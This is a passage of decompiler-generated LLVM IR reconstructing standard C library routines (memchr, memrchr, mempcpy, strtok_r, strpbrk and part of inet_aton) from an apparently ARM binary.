  uselistorder label %dec_label_pc_17380, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17314, { 2, 0, 1 }
  uselistorder label %dec_label_pc_172b4, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_17228, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_171e8, { 1, 0 }
}

define i32 @function_17648(i32 %arg1) local_unnamed_addr {
dec_label_pc_17648:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_17650 = load i32, i32* @r0, align 4
  %v1_17650 = load i32, i32* @r1, align 4
  %v2_17650 = inttoptr i32 %v0_17650 to i8*
  %v3_17650 = call i32 @_memcpy(i8* %v2_17650, i32 %v1_17650)
  ret i32 %v3_17650

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_17660 = load i32, i32* @r4, align 4
  %v6_17660 = load i32, i32* @r5, align 4
  %v9_17660 = load i32, i32* @r6, align 4
  %v1_17664 = urem i32 %arg1, 256
  %v0_1768018 = load i32, i32* @r2, align 4
  %v2_1768020 = icmp eq i32 %v0_1768018, 0
  br i1 %v2_1768020, label %dec_label_pc_17690, label %dec_label_pc_17688

dec_label_pc_1766c:                               ; preds = %dec_label_pc_17688
  %v3_1766c = load i8, i8* %.021, align 1
  %v4_1766c = zext i8 %v3_1766c to i32
  %v9_17670 = icmp eq i32 %v4_1766c, %v1_17664
  %v1_17674 = add i32 %v0_17674, -1
  br i1 %v9_17670, label %bb, label %dec_label_pc_17680

bb:                                               ; preds = %dec_label_pc_1766c
  ret i32 %v1_17688

dec_label_pc_17680:                               ; preds = %dec_label_pc_1766c
  %v2_1767c = add i32 %v1_17688, 1
  %v3_1767c = inttoptr i32 %v2_1767c to i8*
  %v2_17680 = icmp eq i32 %v1_17674, 0
  br i1 %v2_17680, label %dec_label_pc_17690, label %dec_label_pc_17688

dec_label_pc_17688:                               ; preds = %entry, %dec_label_pc_17680
  %v0_17674 = phi i32 [ %v1_17674, %dec_label_pc_17680 ], [ %v0_1768018, %entry ]
  %.021 = phi i8* [ %v3_1767c, %dec_label_pc_17680 ], [ undef, %entry ]
  %v1_17688 = ptrtoint i8* %.021 to i32
  %v2_17688 = urem i32 %v1_17688, 4
  %v3_17688 = icmp eq i32 %v2_17688, 0
  br i1 %v3_17688, label %dec_label_pc_17690, label %dec_label_pc_1766c

dec_label_pc_17690:                               ; preds = %dec_label_pc_17680, %dec_label_pc_17688, %entry
  %v0_1771c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_17680 ], [ %v0_17674, %dec_label_pc_17688 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_1767c, %dec_label_pc_17680 ], [ %.021, %dec_label_pc_17688 ]
  %v4_17690 = mul nuw nsw i32 %v1_17664, 256
  %v5_17690 = or i32 %v4_17690, %v1_17664
  %v1_17694 = ptrtoint i8* %.0.lcssa to i32
  %v4_17698 = mul i32 %v5_17690, 65536
  %v5_17698 = or i32 %v4_17698, %v5_17690
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1771c37, 3
  br i1 %tmp, label %dec_label_pc_176a0, label %dec_label_pc_17744.preheader

dec_label_pc_176a0:                               ; preds = %dec_label_pc_17690, %dec_label_pc_1771c.backedge
  %v0_176bc82 = phi i32 [ %v1_176bc, %dec_label_pc_1771c.backedge ], [ %v0_1771c37, %dec_label_pc_17690 ]
  %v0_176a081 = phi i32 [ %v4_176a0, %dec_label_pc_1771c.backedge ], [ %v1_17694, %dec_label_pc_17690 ]
  %v1_176a0 = inttoptr i32 %v0_176a081 to i32*
  %v2_176a0 = load i32, i32* %v1_176a0, align 4
  %v4_176a0 = add i32 %v0_176a081, 4
  %v2_176a4 = xor i32 %v2_176a0, %v5_17698
  %v2_176a8 = add i32 %v2_176a4, 2130640639
  %v1_176ac = sub i32 -1, %v2_176a4
  %v2_176b0 = xor i32 %v2_176a8, %v1_176ac
  %v2_176b4 = and i32 %v2_176b0, -2130640640
  %v2_176b8 = icmp eq i32 %v2_176b4, 0
  %v1_176bc = add i32 %v0_176bc82, -4
  br i1 %v2_176b8, label %dec_label_pc_1771c.backedge, label %dec_label_pc_176c4

dec_label_pc_1771c.backedge:                      ; preds = %dec_label_pc_176a0, %dec_label_pc_17708
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_176bc, 3
  br i1 %tmp107, label %dec_label_pc_176a0, label %dec_label_pc_17744.preheader

dec_label_pc_176c4:                               ; preds = %dec_label_pc_176a0
  %v2_176c4 = inttoptr i32 %v0_176a081 to i8*
  %v3_176c4 = load i8, i8* %v2_176c4, align 1
  %v4_176c4 = zext i8 %v3_176c4 to i32
  %v9_176cc = icmp eq i32 %v4_176c4, %v1_17664
  %v1_176d0 = add i32 %v0_176a081, 3
  %v1_176d4 = add i32 %v0_176a081, 1
  store i32 %v1_176d4, i32* @lr, align 4
  %v1_176d8 = add i32 %v0_176a081, 2
  br i1 %v9_176cc, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_176c4
  store i32 %v3_17660, i32* @r4, align 4
  store i32 %v6_17660, i32* @r5, align 4
  store i32 %v9_17660, i32* @r6, align 4
  ret i32 %v0_176a081

bb51:                                             ; preds = %dec_label_pc_176c4
  %v2_176e0 = inttoptr i32 %v1_176d4 to i8*
  %v3_176e0 = load i8, i8* %v2_176e0, align 1
  %v4_176e0 = zext i8 %v3_176e0 to i32
  %v9_176e4 = icmp eq i32 %v4_176e0, %v1_17664
  br i1 %v9_176e4, label %dec_label_pc_176ec, label %dec_label_pc_176f4

dec_label_pc_176ec:                               ; preds = %bb51
  store i32 %v3_17660, i32* @r4, align 4
  store i32 %v6_17660, i32* @r5, align 4
  store i32 %v9_17660, i32* @r6, align 4
  ret i32 %v1_176d4

dec_label_pc_176f4:                               ; preds = %bb51
  %v2_176f4 = inttoptr i32 %v1_176d8 to i8*
  %v3_176f4 = load i8, i8* %v2_176f4, align 1
  %v4_176f4 = zext i8 %v3_176f4 to i32
  %v9_176f8 = icmp eq i32 %v4_176f4, %v1_17664
  br i1 %v9_176f8, label %dec_label_pc_17700, label %dec_label_pc_17708

dec_label_pc_17700:                               ; preds = %dec_label_pc_176f4
  store i32 %v3_17660, i32* @r4, align 4
  store i32 %v6_17660, i32* @r5, align 4
  store i32 %v9_17660, i32* @r6, align 4
  ret i32 %v1_176d8

dec_label_pc_17708:                               ; preds = %dec_label_pc_176f4
  %v2_17708 = inttoptr i32 %v1_176d0 to i8*
  %v3_17708 = load i8, i8* %v2_17708, align 1
  %v4_17708 = zext i8 %v3_17708 to i32
  %v9_1770c = icmp eq i32 %v4_17708, %v1_17664
  br i1 %v9_1770c, label %dec_label_pc_17714, label %dec_label_pc_1771c.backedge

dec_label_pc_17714:                               ; preds = %dec_label_pc_17708
  store i32 %v3_17660, i32* @r4, align 4
  store i32 %v6_17660, i32* @r5, align 4
  store i32 %v9_17660, i32* @r6, align 4
  ret i32 %v1_176d0

dec_label_pc_17744.preheader:                     ; preds = %dec_label_pc_1771c.backedge, %dec_label_pc_17690
  %v0_176a0.lcssa = phi i32 [ %v1_17694, %dec_label_pc_17690 ], [ %v4_176a0, %dec_label_pc_1771c.backedge ]
  %v0_176bc.lcssa = phi i32 [ %v0_1771c37, %dec_label_pc_17690 ], [ %v1_176bc, %dec_label_pc_1771c.backedge ]
  %v2_1774411 = icmp eq i32 %v0_176bc.lcssa, 0
  br i1 %v2_1774411, label %dec_label_pc_1774c, label %dec_label_pc_17734

dec_label_pc_17734:                               ; preds = %dec_label_pc_17744, %dec_label_pc_17744.preheader
  %v0_17744.in = phi i32 [ %v0_17744, %dec_label_pc_17744 ], [ %v0_176bc.lcssa, %dec_label_pc_17744.preheader ]
  %v15_1773c = phi i32 [ %v1_17740, %dec_label_pc_17744 ], [ %v0_176a0.lcssa, %dec_label_pc_17744.preheader ]
  %v0_17744 = add i32 %v0_17744.in, -1
  %v1_17734 = inttoptr i32 %v15_1773c to i8*
  %v2_17734 = load i8, i8* %v1_17734, align 1
  %v3_17734 = zext i8 %v2_17734 to i32
  %v9_17738 = icmp eq i32 %v3_17734, %v1_17664
  br i1 %v9_17738, label %bb52, label %dec_label_pc_17744

bb52:                                             ; preds = %dec_label_pc_17734
  store i32 %v3_17660, i32* @r4, align 4
  store i32 %v6_17660, i32* @r5, align 4
  store i32 %v9_17660, i32* @r6, align 4
  ret i32 %v15_1773c

dec_label_pc_17744:                               ; preds = %dec_label_pc_17734
  %v1_17740 = add i32 %v15_1773c, 1
  %v2_17744 = icmp eq i32 %v0_17744, 0
  br i1 %v2_17744, label %dec_label_pc_1774c, label %dec_label_pc_17734

dec_label_pc_1774c:                               ; preds = %dec_label_pc_17744, %dec_label_pc_17744.preheader
  store i32 %v3_17660, i32* @r4, align 4
  store i32 %v6_17660, i32* @r5, align 4
  store i32 %v9_17660, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1773c, { 1, 0, 2 }
  uselistorder i32 %v1_176bc, { 1, 0, 2 }
  uselistorder i32 %v0_176a081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_17690, { 1, 0 }
  uselistorder i32 %v0_1771c37, { 1, 2, 0 }
  uselistorder i32 %v1_17664, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_17660, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1771c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_176a0, { 1, 0 }
  uselistorder label %dec_label_pc_17690, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17688, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17768 = call i32 @memcpy()
  %v0_1776c = load i32, i32* @r5, align 4
  %v1_1776c = load i32, i32* @r4, align 4
  %v2_1776c = add i32 %v1_1776c, %v0_1776c
  ret i32 %v2_1776c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_17774 = load i32, i32* @r4, align 4
  %v1_17778 = urem i32 %arg2, 256
  %v2_1777c = add i32 %arg3, %arg1
  %v2_177942 = icmp eq i32 %arg3, 0
  br i1 %v2_177942, label %dec_label_pc_177a4, label %dec_label_pc_1779c

dec_label_pc_17784:                               ; preds = %dec_label_pc_1779c
  %v1_17784 = add i32 %v0_17784, -1
  %v2_17784 = inttoptr i32 %v1_17784 to i8*
  %v3_17784 = load i8, i8* %v2_17784, align 1
  %v4_17784 = zext i8 %v3_17784 to i32
  %v9_17788 = icmp eq i32 %v4_17784, %v1_17778
  br i1 %v9_17788, label %bb, label %dec_label_pc_17794

bb:                                               ; preds = %dec_label_pc_17784
  ret i32 %v1_17784

dec_label_pc_17794:                               ; preds = %dec_label_pc_17784
  %v1_17790 = add i32 %v0_17790, -1
  %v2_17794 = icmp eq i32 %v1_17790, 0
  br i1 %v2_17794, label %dec_label_pc_177a4, label %dec_label_pc_1779c

dec_label_pc_1779c:                               ; preds = %entry, %dec_label_pc_17794
  %v0_17790 = phi i32 [ %v1_17790, %dec_label_pc_17794 ], [ %arg3, %entry ]
  %v0_17784 = phi i32 [ %v1_17784, %dec_label_pc_17794 ], [ %v2_1777c, %entry ]
  %v1_1779c = urem i32 %v0_17784, 4
  %v2_1779c = icmp eq i32 %v1_1779c, 0
  br i1 %v2_1779c, label %dec_label_pc_177a4, label %dec_label_pc_17784

dec_label_pc_177a4:                               ; preds = %dec_label_pc_17794, %dec_label_pc_1779c, %entry
  %v0_1783c11 = phi i32 [ %v2_1777c, %entry ], [ %v1_17784, %dec_label_pc_17794 ], [ %v0_17784, %dec_label_pc_1779c ]
  %v0_178287 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_17794 ], [ %v0_17790, %dec_label_pc_1779c ]
  %v4_177a4 = mul nuw nsw i32 %v1_17778, 256
  %v5_177a4 = or i32 %v4_177a4, %v1_17778
  %v4_177a8 = mul i32 %v5_177a4, 65536
  %v5_177a8 = or i32 %v4_177a8, %v5_177a4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_178287, 3
  br i1 %tmp, label %dec_label_pc_177b0, label %dec_label_pc_17838

dec_label_pc_177b0:                               ; preds = %dec_label_pc_177a4, %.backedge.backedge
  %v0_177cc51 = phi i32 [ %v1_177cc, %.backedge.backedge ], [ %v0_178287, %dec_label_pc_177a4 ]
  %v0_177b050 = phi i32 [ %v1_177b0, %.backedge.backedge ], [ %v0_1783c11, %dec_label_pc_177a4 ]
  %v1_177b0 = add i32 %v0_177b050, -4
  %v2_177b0 = inttoptr i32 %v1_177b0 to i32*
  %v3_177b0 = load i32, i32* %v2_177b0, align 4
  %v2_177b4 = xor i32 %v3_177b0, %v5_177a8
  %v2_177b8 = add i32 %v2_177b4, 2130640639
  %v1_177bc = sub i32 -1, %v2_177b4
  %v2_177c0 = xor i32 %v2_177b8, %v1_177bc
  %v2_177c4 = and i32 %v2_177c0, -2130640640
  %v2_177c8 = icmp eq i32 %v2_177c4, 0
  %v1_177cc = add i32 %v0_177cc51, -4
  br i1 %v2_177c8, label %.backedge.backedge, label %dec_label_pc_177d4

dec_label_pc_177d4:                               ; preds = %dec_label_pc_177b0
  %v1_177d4 = add i32 %v0_177b050, -1
  %v2_177d4 = inttoptr i32 %v1_177d4 to i8*
  %v3_177d4 = load i8, i8* %v2_177d4, align 1
  %v4_177d4 = zext i8 %v3_177d4 to i32
  %v9_177d8 = icmp eq i32 %v4_177d4, %v1_17778
  %v1_177dc = add i32 %v0_177b050, -2
  %v1_177e4 = add i32 %v0_177b050, -3
  store i32 %v1_177e4, i32* @lr, align 4
  br i1 %v9_177d8, label %dec_label_pc_177ec, label %dec_label_pc_177f4

dec_label_pc_177ec:                               ; preds = %dec_label_pc_177d4
  store i32 %v3_17774, i32* @r4, align 4
  ret i32 %v1_177d4

dec_label_pc_177f4:                               ; preds = %dec_label_pc_177d4
  %v2_177f4 = inttoptr i32 %v1_177dc to i8*
  %v3_177f4 = load i8, i8* %v2_177f4, align 1
  %v4_177f4 = zext i8 %v3_177f4 to i32
  %v9_177f8 = icmp eq i32 %v4_177f4, %v1_17778
  br i1 %v9_177f8, label %dec_label_pc_17800, label %dec_label_pc_17808

dec_label_pc_17800:                               ; preds = %dec_label_pc_177f4
  store i32 %v3_17774, i32* @r4, align 4
  ret i32 %v1_177dc

dec_label_pc_17808:                               ; preds = %dec_label_pc_177f4
  %v2_17808 = inttoptr i32 %v1_177e4 to i8*
  %v3_17808 = load i8, i8* %v2_17808, align 1
  %v4_17808 = zext i8 %v3_17808 to i32
  %v9_1780c = icmp eq i32 %v4_17808, %v1_17778
  br i1 %v9_1780c, label %dec_label_pc_17814, label %dec_label_pc_1781c

dec_label_pc_17814:                               ; preds = %dec_label_pc_17808
  store i32 %v3_17774, i32* @r4, align 4
  ret i32 %v1_177e4

dec_label_pc_1781c:                               ; preds = %dec_label_pc_17808
  %v1_1781c = inttoptr i32 %v1_177b0 to i8*
  %v2_1781c = load i8, i8* %v1_1781c, align 1
  %v3_1781c = zext i8 %v2_1781c to i32
  %v9_17820 = icmp eq i32 %v3_1781c, %v1_17778
  br i1 %v9_17820, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1781c, %dec_label_pc_177b0
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_177cc, 3
  br i1 %tmp70, label %dec_label_pc_177b0, label %dec_label_pc_17838

bb19:                                             ; preds = %dec_label_pc_1781c
  store i32 %v3_17774, i32* @r4, align 4
  ret i32 %v1_177b0

dec_label_pc_1783c:                               ; preds = %dec_label_pc_17838
  %v1_17848 = add i32 %v0_17848, -1
  %v1_1783c = add i32 %v0_1783c, -1
  %v2_1783c = inttoptr i32 %v1_1783c to i8*
  %v3_1783c = load i8, i8* %v2_1783c, align 1
  %v4_1783c = zext i8 %v3_1783c to i32
  %v9_17840 = icmp eq i32 %v4_1783c, %v1_17778
  br i1 %v9_17840, label %bb20, label %dec_label_pc_17838

bb20:                                             ; preds = %dec_label_pc_1783c
  store i32 %v3_17774, i32* @r4, align 4
  ret i32 %v1_1783c

dec_label_pc_17838:                               ; preds = %dec_label_pc_177a4, %.backedge.backedge, %dec_label_pc_1783c
  %v0_1783c = phi i32 [ %v1_1783c, %dec_label_pc_1783c ], [ %v0_1783c11, %dec_label_pc_177a4 ], [ %v1_177b0, %.backedge.backedge ]
  %v0_17848 = phi i32 [ %v1_17848, %dec_label_pc_1783c ], [ %v0_178287, %dec_label_pc_177a4 ], [ %v1_177cc, %.backedge.backedge ]
  %v2_17848 = icmp eq i32 %v0_17848, 0
  br i1 %v2_17848, label %dec_label_pc_17850, label %dec_label_pc_1783c

dec_label_pc_17850:                               ; preds = %dec_label_pc_17838
  store i32 %v3_17774, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_17848, { 1, 0 }
  uselistorder i32 %v1_177cc, { 1, 0, 2 }
  uselistorder i32 %v1_177b0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_177b050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_177a4, { 1, 0 }
  uselistorder i32 %v0_178287, { 1, 2, 0 }
  uselistorder i32 %v0_17784, { 1, 0, 2 }
  uselistorder i32 %v1_17784, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1777c, { 1, 0 }
  uselistorder i32 %v1_17778, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_17774, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17838, { 2, 1, 0 }
  uselistorder label %dec_label_pc_177b0, { 1, 0 }
  uselistorder label %dec_label_pc_177a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1779c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17860 = load i32, i32* @r4, align 4
  store i32 %v3_17860, i32* %stack_var_-16, align 4
  %v6_17860 = load i32, i32* @r5, align 4
  %v0_17864 = load i32, i32* @r0, align 4
  store i32 %v0_17864, i32* %r4.global-to-local, align 4
  %v2_17864 = icmp eq i32 %v0_17864, 0
  %v1_17868 = load i32, i32* @r2, align 4
  br i1 %v2_17864, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_17868 = inttoptr i32 %v1_17868 to i32*
  %v3_17868 = load i32, i32* %v2_17868, align 4
  store i32 %v3_17868, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1786c = phi i32 [ %v3_17868, %bb ], [ %v0_17864, %entry ]
  store i32 %v0_1786c, i32* @r0, align 4
  store i32 %v1_17868, i32* @r5, align 4
  %v0_17874 = load i32, i32* @r1, align 4
  store i32 %v0_17874, i32* %r6.global-to-local, align 4
  %v1_17878 = inttoptr i32 %v0_1786c to i8*
  %v2_17878 = call i32 @__GI_strspn(i8* %v1_17878)
  %v0_1787c = load i32, i32* %r4.global-to-local, align 4
  %v2_1787c = add i32 %v0_1787c, %v2_17878
  %v3_1787c = inttoptr i32 %v2_1787c to i8*
  %v4_1787c = load i8, i8* %v3_1787c, align 1
  %v6_1787c = zext i8 %v4_1787c to i32
  store i32 %v6_1787c, i32* %r3.global-to-local, align 4
  store i32 %v2_1787c, i32* @r4, align 4
  %v2_17884 = icmp eq i8 %v4_1787c, 0
  store i1 %v2_17884, i1* @cpsr_z, align 1
  %v0_17888 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17888, i32* @r1, align 4
  store i32 %v2_1787c, i32* @r0, align 4
  br i1 %v2_17884, label %bb7, label %dec_label_pc_17898

bb7:                                              ; preds = %entry._crit_edge
  %v2_17890 = load i32, i32* @r5, align 4
  %v3_17890 = inttoptr i32 %v2_17890 to i32*
  store i32 %v2_1787c, i32* %v3_17890, align 4
  br label %dec_label_pc_178cc

dec_label_pc_17898:                               ; preds = %entry._crit_edge
  %v0_17898 = call i32 @__GI_strpbrk()
  store i32 %v0_17898, i32* %r2.global-to-local, align 4
  %v3_1789c = icmp eq i32 %v0_17898, 0
  store i1 %v3_1789c, i1* @cpsr_z, align 1
  br i1 %v3_1789c, label %dec_label_pc_178ac, label %dec_label_pc_178bc

dec_label_pc_178ac:                               ; preds = %dec_label_pc_17898
  %v0_178a4 = load i32, i32* @r4, align 4
  %v2_178ac = call i32 @rawmemchr(i32 %v0_178a4, i32 0)
  %v0_178b0 = load i32, i32* @r4, align 4
  store i32 %v0_178b0, i32* %r3.global-to-local, align 4
  %v1_178b4 = load i32, i32* @r5, align 4
  %v2_178b4 = inttoptr i32 %v1_178b4 to i32*
  store i32 %v2_178ac, i32* %v2_178b4, align 4
  br label %dec_label_pc_178cc

dec_label_pc_178bc:                               ; preds = %dec_label_pc_17898
  %v3_178c0 = inttoptr i32 %v0_17898 to i8*
  store i8 0, i8* %v3_178c0, align 1
  %v4_178c0 = load i32, i32* %r2.global-to-local, align 4
  %v5_178c0 = add i32 %v4_178c0, 1
  store i32 %v5_178c0, i32* @r2, align 4
  %v1_178c4 = load i32, i32* @r5, align 4
  %v2_178c4 = inttoptr i32 %v1_178c4 to i32*
  store i32 %v5_178c0, i32* %v2_178c4, align 4
  %v0_178c8 = load i32, i32* @r4, align 4
  store i32 %v0_178c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178cc

dec_label_pc_178cc:                               ; preds = %bb7, %dec_label_pc_178ac, %dec_label_pc_178bc
  %v0_178cc = load i32, i32* %r3.global-to-local, align 4
  %v2_178d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_178d0, i32* @r4, align 4
  store i32 %v6_17860, i32* @r5, align 4
  ret i32 %v0_178cc

; uselistorder directives
  uselistorder i32 %v0_1786c, { 1, 0 }
  uselistorder i32 %v0_17864, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_178cc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_178d4 = load i32, i32* @r0, align 4
  %v1_178f82 = inttoptr i32 %v0_178d4 to i8*
  %v2_178f83 = load i8, i8* %v1_178f82, align 1
  %v3_178f84 = zext i8 %v2_178f83 to i32
  %v2_178fc5 = icmp eq i8 %v2_178f83, 0
  br i1 %v2_178fc5, label %dec_label_pc_178f8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_17904.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_178dc:                               ; preds = %dec_label_pc_178e4
  %v1_178ec = add i32 %v0_178ec, 1
  %v9_178dc = icmp eq i32 %v3_178e4, %v3_178f86
  br i1 %v9_178dc, label %dec_label_pc_1790c, label %dec_label_pc_178e4

dec_label_pc_178e4:                               ; preds = %dec_label_pc_178dc, %bb
  %v0_178ec = phi i32 [ %v1_178ec, %dec_label_pc_178dc ], [ %v0_17904.pre, %bb ]
  %v1_178e4 = inttoptr i32 %v0_178ec to i8*
  %v2_178e4 = load i8, i8* %v1_178e4, align 1
  %v3_178e4 = zext i8 %v2_178e4 to i32
  store i32 %v3_178e4, i32* @ip, align 4
  %v2_178e8 = icmp eq i8 %v2_178e4, 0
  br i1 %v2_178e8, label %dec_label_pc_178f4, label %dec_label_pc_178dc

dec_label_pc_178f4:                               ; preds = %dec_label_pc_178e4
  %v1_178f4 = add i32 %v0_178f4, 1
  %v1_178f8 = inttoptr i32 %v1_178f4 to i8*
  %v2_178f8 = load i8, i8* %v1_178f8, align 1
  %v3_178f8 = zext i8 %v2_178f8 to i32
  %v2_178fc = icmp eq i8 %v2_178f8, 0
  br i1 %v2_178fc, label %dec_label_pc_178f8._crit_edge, label %bb

dec_label_pc_178f8._crit_edge:                    ; preds = %dec_label_pc_178f4, %entry
  %v3_178f8.lcssa = phi i32 [ %v3_178f84, %entry ], [ %v3_178f8, %dec_label_pc_178f4 ]
  ret i32 %v3_178f8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_178f4
  %v0_178f4 = phi i32 [ %v0_178d4, %.lr.ph ], [ %v1_178f4, %dec_label_pc_178f4 ]
  %v3_178f86 = phi i32 [ %v3_178f84, %.lr.ph ], [ %v3_178f8, %dec_label_pc_178f4 ]
  br label %dec_label_pc_178e4

dec_label_pc_1790c:                               ; preds = %dec_label_pc_178dc
  ret i32 %v0_178f4

; uselistorder directives
  uselistorder i32 %v3_178f8, { 1, 0 }
  uselistorder i32 %v3_178e4, { 1, 0 }
  uselistorder i32 %v0_178ec, { 1, 0 }
  uselistorder i32 %v3_178f84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_178e4, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_17914 = load i32, i32* %r0.global-to-local, align 4
  %v2_17914 = icmp eq i32 %v0_17914, 0
  %v3_17918 = load i32, i32* @r4, align 4
  store i32 %v3_17918, i32* %stack_var_-20, align 4
  br i1 %v2_17914, label %dec_label_pc_179f4, label %dec_label_pc_17930.lr.ph

dec_label_pc_17930:                               ; preds = %dec_label_pc_17930.lr.ph, %dec_label_pc_179b4
  %v1_179b4 = phi i32 [ 0, %dec_label_pc_17930.lr.ph ], [ %v5_179b4, %dec_label_pc_179b4 ]
  %v0_179b8 = phi i32 [ 1, %dec_label_pc_17930.lr.ph ], [ %v1_179b8, %dec_label_pc_179b4 ]
  %v0_17938 = phi i32 [ %v0_17914, %dec_label_pc_17930.lr.ph ], [ %v0_1793825, %dec_label_pc_179b4 ]
  store i32 %v2_17934.pre, i32* @lr, align 4
  %v1_17938 = inttoptr i32 %v0_17938 to i8*
  %v2_17938 = load i8, i8* %v1_17938, align 1
  %v3_17938 = zext i8 %v2_17938 to i32
  %v3_1793c = mul nuw nsw i32 %v3_17938, 2
  %v4_1793c = add i32 %v3_1793c, %v2_17934.pre
  %v5_1793c = inttoptr i32 %v4_1793c to i8*
  %v6_1793c = load i8, i8* %v5_1793c, align 1
  %v1_17940 = and i8 %v6_1793c, 8
  %v2_17940 = icmp eq i8 %v1_17940, 0
  br i1 %v2_17940, label %dec_label_pc_179f4, label %dec_label_pc_17948

dec_label_pc_17948:                               ; preds = %dec_label_pc_17930
  br label %dec_label_pc_17968

dec_label_pc_17950:                               ; preds = %dec_label_pc_17968
  %v3_17954 = mul i32 %v0_179b4, 10
  %v4_17954 = add i32 %v3_17968, %v3_17954
  %v1_17958 = add i32 %v4_17954, -48
  %v8_17960 = icmp sgt i32 %v1_17958, 255
  br i1 %v8_17960, label %dec_label_pc_179f4, label %dec_label_pc_17964

dec_label_pc_17964:                               ; preds = %dec_label_pc_17950
  %v1_17964 = add i32 %v0_179a4, 1
  store i32 %v1_17964, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17968

dec_label_pc_17968:                               ; preds = %dec_label_pc_17948, %dec_label_pc_17964
  %v0_179b4 = phi i32 [ 0, %dec_label_pc_17948 ], [ %v1_17958, %dec_label_pc_17964 ]
  %v0_179a4 = phi i32 [ %v0_17938, %dec_label_pc_17948 ], [ %v1_17964, %dec_label_pc_17964 ]
  %v1_17968 = inttoptr i32 %v0_179a4 to i8*
  %v2_17968 = load i8, i8* %v1_17968, align 1
  %v3_17968 = zext i8 %v2_17968 to i32
  %v2_1796c = mul nuw nsw i32 %v3_17968, 2
  %v2_17970 = add i32 %v2_1796c, %v2_17934.pre
  %v3_17974 = inttoptr i32 %v2_17970 to i8*
  %v4_17974 = load i8, i8* %v3_17974, align 1
  %v6_17974 = zext i8 %v4_17974 to i32
  %v1_17980 = and i32 %v6_17974, 8
  %v2_17980 = icmp eq i32 %v1_17980, 0
  br i1 %v2_17980, label %dec_label_pc_17988, label %dec_label_pc_17950

dec_label_pc_17988:                               ; preds = %dec_label_pc_17968
  %v8_1798c = icmp sgt i32 %v0_179b8, 3
  br i1 %v8_1798c, label %dec_label_pc_179a0, label %dec_label_pc_17990

dec_label_pc_17990:                               ; preds = %dec_label_pc_17988
  %v7_17990 = icmp eq i8 %v2_17968, 46
  br i1 %v7_17990, label %dec_label_pc_17998, label %dec_label_pc_179f4

dec_label_pc_17998:                               ; preds = %dec_label_pc_17990
  %v1_17998 = add i32 %v0_179a4, 1
